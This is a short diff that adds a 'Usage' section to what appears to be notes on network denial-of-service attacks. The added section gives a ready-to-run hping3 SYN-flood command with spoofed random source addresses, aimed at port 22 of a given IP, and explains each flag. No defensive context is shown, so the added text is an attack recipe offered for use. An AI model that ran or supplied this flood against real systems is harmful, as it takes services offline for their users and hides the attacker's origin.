@@ -6,4 +6,12 @@
 4. Exploit known vulnerabilities of TCP/IP Stacks
 ```
 #Usage
-##
+## Random SRC_IP
+hping3 -c 1000 -d 120 -S -w 64 -p 22 --flood --rand-source 172.28.241.90
+:-c number of packets
+:-d size of each packet
+:-S SYNC only
+:-w size of Window
+:-p port of Target
+
+
